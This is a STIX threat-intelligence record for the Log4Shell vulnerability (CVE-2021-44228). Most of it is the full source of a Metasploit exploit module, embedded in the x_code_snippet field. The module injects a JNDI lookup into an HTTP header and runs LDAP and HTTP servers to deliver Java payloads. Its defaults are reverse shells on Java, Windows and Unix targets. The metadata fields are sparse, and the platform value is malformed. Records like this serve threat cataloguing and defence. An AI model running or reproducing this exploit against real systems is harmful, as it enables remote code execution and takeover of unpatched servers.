{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a102bb53-119b-49a7-b0b8-b76d8e7c8c4a",
    "created": "2024-08-14T17:08:35.879547Z",
    "modified": "2024-08-14T17:08:35.879551Z",
    "name": "Log4Shell HTTP Header Injection",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/log4shell_header_injection.rb",
            "external_id": "log4shell_header_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-44228"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Log4Shell\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::CheckModule\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(_info = {})\n    super(\n      'Name' => 'Log4Shell HTTP Header Injection',\n      'Description' => %q{\n        Versions of Apache Log4j2 impacted by CVE-2021-44228 which allow JNDI features used in configuration,\n        log messages, and parameters, do not protect against attacker controlled LDAP and other JNDI related endpoints.\n\n        This module will exploit an HTTP end point with the Log4Shell vulnerability by injecting a format message that\n        will trigger an LDAP connection to Metasploit and load a payload.\n\n        The Automatic target delivers a Java payload using remote class loading. This requires Metasploit to run an HTTP\n        server in addition to the LDAP server that the target can connect to. The targeted application must have the\n        trusted code base option enabled for this technique to work.\n\n        The non-Automatic targets deliver a payload via a serialized Java object. This does not require Metasploit to\n        run an HTTP server and instead leverages the LDAP server to deliver the serialized object. The target\n        application in this case must be compatible with the user-specified JAVA_GADGET_CHAIN option.\n      },\n      'Author' => [\n        'Michael Schierl', # Technical guidance, examples, and patience - all of the Jedi stuff\n        'juan vazquez', # 2011-3544 building blocks reused in this module\n        'sinn3r', # 2011-3544 building blocks reused in this module\n        'Spencer McIntyre', # Kickoff on 2021-44228 work, improvements, and polish required for formal acceptance\n        'RageLtMan <rageltman[at]sempervictus>' # Metasploit module and infrastructure\n      ],\n      'References' => [\n        [ 'CVE', '2021-44228' ],\n      ],\n      'DisclosureDate' => '2021-12-09',\n      'License' => MSF_LICENSE,\n      'DefaultOptions' => {\n        'SRVPORT' => 389,\n        'WfsDelay' => 30,\n        'CheckModule' => 'auxiliary/scanner/http/log4shell_scanner'\n      },\n      'Targets' => [\n        [\n          'Automatic', {\n            'Platform' => 'java',\n            'Arch' => [ARCH_JAVA],\n            'RemoteLoad' => true,\n            'DefaultOptions' => {\n              'PAYLOAD' => 'java/shell_reverse_tcp'\n            }\n          }\n        ],\n        [\n          'Windows', {\n            'Platform' => 'win',\n            'RemoteLoad' => false,\n            'DefaultOptions' => {\n              'PAYLOAD' => 'windows/meterpreter/reverse_tcp'\n            }\n          },\n        ],\n        [\n          'Linux', {\n            'Platform' => 'unix',\n            'RemoteLoad' => false,\n            'Arch' => [ARCH_CMD],\n            'DefaultOptions' => {\n              'PAYLOAD' => 'cmd/unix/reverse_bash'\n            }\n          },\n        ]\n      ],\n      'Notes' => {\n        'Stability' => [CRASH_SAFE],\n        'SideEffects' => [IOC_IN_LOGS],\n        'AKA' => ['Log4Shell', 'LogJam'],\n        'Reliability' => [REPEATABLE_SESSION],\n        'RelatedModules' => [ 'auxiliary/scanner/http/log4shell_scanner' ]\n      }\n    )\n    register_options([\n      OptString.new('HTTP_METHOD', [ true, 'The HTTP method to use', 'GET' ]),\n      OptString.new('TARGETURI', [ true, 'The URI to scan', '/']),\n      OptString.new('HTTP_HEADER', [ false, 'The HTTP header to inject into' ]),\n      OptEnum.new('JAVA_GADGET_CHAIN', [\n        true, 'The Java gadget chain to use for deserialization', 'CommonsBeanutils1',\n        Msf::Exploit::JavaDeserialization.gadget_chains\n      ], conditions: %w[TARGET != Automatic]),\n      OptPort.new('HTTP_SRVPORT', [true, 'The HTTP server port', 8080], conditions: %w[TARGET == Automatic])\n    ])\n    register_advanced_options([\n      OptPort.new('HttpListenerBindPort', [false, 'The port to bind to if different from HTTP_SRVPORT'])\n    ])\n  end\n\n  def check\n    validate_configuration!\n\n    @checkcode = super\n  end\n\n  def check_options\n    opts = { 'LDAP_TIMEOUT' => datastore['WfsDelay'], 'URIS_FILE' => nil }\n    opts['HEADERS_FILE'] = nil unless datastore['HTTP_HEADER'].blank?\n    opts\n  end\n\n  def resource_url_string\n    \"http#{datastore['SSL'] ? 's' : ''}://#{datastore['SRVHOST']}:#{datastore['HTTP_SRVPORT']}#{resource_uri}\"\n  end\n\n  #\n  # Use Ruby Java bridge to create a Java-natively-serialized object\n  #\n  # @return [String] Marshalled serialized byteArray of the loader class\n  def byte_array_payload(pay_class = 'metasploit.PayloadFactory')\n    jar = generate_payload.encoded_jar\n    serialized_class_from_jar(jar, pay_class)\n  end\n\n  #\n  # Insert PayloadFactory in Java payload JAR\n  #\n  # @param jar [Rex::Zip::Jar] payload JAR to update\n  # @return [Rex::Zip::Jar] updated payload JAR\n  def inject_jar_payload_factory(jar = generate_payload.encoded_jar)\n    # From exploits/multi/browser/java_rhino - should probably go to lib\n    paths = [\n      [ 'metasploit/PayloadFactory.class' ]\n    ]\n    paths.each do |path|\n      1.upto(path.length - 1) do |idx|\n        full = path[0, idx].join('/') + '/'\n        jar.add_file(full, '') unless jar.entries.map(&:name).include?(full)\n      end\n      File.open(File.join(Msf::Config.data_directory, 'exploits', 'CVE-2021-44228', path), 'rb') do |fd|\n        data = fd.read(fd.stat.size)\n        jar.add_file(path.join('/'), data)\n      end\n    end\n    jar\n  end\n\n  def build_ldap_search_response_payload\n    if target['RemoteLoad']\n      build_ldap_search_response_payload_remote(resource_url_string)\n    else\n      build_ldap_search_response_payload_inline(datastore['JAVA_GADGET_CHAIN'])\n    end\n  end\n\n  ## HTTP service callbacks\n  #\n  # Handle HTTP requests and responses\n  #\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    vprint_good(\"Payload requested by #{cli.peerhost} using #{agent}\")\n    pay = regenerate_payload(cli)\n    jar = inject_jar_payload_factory(pay.encoded_jar)\n    send_response(cli, 200, 'OK', jar)\n  end\n\n  #\n  # Create an HTTP response and then send it\n  #\n  def send_response(cli, code, message = 'OK', html = '')\n    proto = Rex::Proto::Http::DefaultProtocol\n    res = Rex::Proto::Http::Response.new(code, message, proto)\n    res['Content-Type'] = 'application/java-archive'\n    res.body = html\n    cli.send_response(res)\n  end\n\n  def exploit\n    validate_configuration!\n    if datastore['HTTP_HEADER'].blank?\n      targetinfo = (@checkcode&.details || []).reject { |ti| ti[:headers].blank? }.first\n      http_header = targetinfo[:headers].keys.first if targetinfo\n      fail_with(Failure::BadConfig, 'No HTTP_HEADER was specified and none were found automatically') unless http_header\n\n      print_good(\"Automatically identified vulnerable header: #{http_header}\")\n    else\n      http_header = datastore['HTTP_HEADER']\n    end\n\n    # LDAP service\n    start_service\n    # HTTP service\n    if target['RemoteLoad']\n      start_http_service('ServerPort' => (datastore['HttpListenerBindPort'].blank? ? datastore['HTTP_SRVPORT'] : datastore['HttpListenerBindPort']).to_i)\n    end\n    # HTTP request initiator\n    send_request_raw(\n      'uri' => normalize_uri(target_uri),\n      'method' => datastore['HTTP_METHOD'],\n      'headers' => { http_header => log4j_jndi_string }\n    )\n    sleep(datastore['WfsDelay'])\n    handler\n  ensure\n    cleanup\n  end\n\n  #\n  # Kill HTTP & LDAP services (shut them down and clear resources)\n  #\n  def cleanup\n    # Clean and stop HTTP server\n    if @http_service\n      begin\n        @http_service.remove_resource(datastore['URIPATH'])\n        @http_service.deref\n        @http_service.stop\n        @http_service = nil\n      rescue StandardError => e\n        print_error(\"Failed to stop http server due to #{e}\")\n      end\n    end\n    super\n  end\n\n  def validate_configuration!\n    super\n\n    if datastore['HTTP_HEADER'].blank? && !datastore['AutoCheck']\n      fail_with(Exploit::Failure::BadConfig, 'Either the AutoCheck option must be enabled or an HTTP_HEADER must be specified.')\n    end\n  end\n\n  private\n\n  # Boilerplate HTTP service code\n  #\n  # Returns the configured (or random, if not configured) URI path\n  #\n  def resource_uri\n    path = datastore['URIPATH'] || rand_text_alphanumeric(rand(8..15)) + '.jar'\n    path = '/' + path if path !~ %r{^/}\n    if path !~ /\\.jar$/\n      print_status(\"Appending .jar extension to #{path} as we don't yet serve classpaths\")\n      path += '.jar'\n    end\n    datastore['URIPATH'] = path\n    return path\n  end\n\n  #\n  # Handle the HTTP request and return a response.  Code borrowed from:\n  # msf/core/exploit/http/server.rb\n  #\n  def start_http_service(opts = {})\n    # Start a new HTTP server\n    @http_service = Rex::ServiceManager.start(\n      Rex::Proto::Http::Server,\n      (opts['ServerPort'] || bindport).to_i,\n      opts['ServerHost'] || bindhost,\n      datastore['SSL'],\n      {\n        'Msf' => framework,\n        'MsfExploit' => self\n      },\n      opts['Comm'] || _determine_server_comm(opts['ServerHost'] || bindhost),\n      datastore['SSLCert'],\n      datastore['SSLCompression'],\n      datastore['SSLCipher'],\n      datastore['SSLVersion']\n    )\n    @http_service.server_name = datastore['HTTP::server_name']\n    # Default the procedure of the URI to on_request_uri if one isn't\n    # provided.\n    uopts = {\n      'Proc' => method(:on_request_uri),\n      'Path' => resource_uri\n    }.update(opts['Uri'] || {})\n    proto = (datastore['SSL'] ? 'https' : 'http')\n\n    netloc = opts['ServerHost'] || bindhost\n    http_srvport = (opts['ServerPort'] || bindport).to_i\n    if (proto == 'http' && http_srvport != 80) || (proto == 'https' && http_srvport != 443)\n      if Rex::Socket.is_ipv6?(netloc)\n        netloc = \"[#{netloc}]:#{http_srvport}\"\n      else\n        netloc = \"#{netloc}:#{http_srvport}\"\n      end\n    end\n    print_status(\"Serving Java code on: #{proto}://#{netloc}#{uopts['Path']}\")\n\n    # Add path to resource\n    @service_path = uopts['Path']\n    @http_service.add_resource(uopts['Path'], uopts)\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2021-12-09",
    "x_mitre_platforms": [
        "unix'"
    ]
}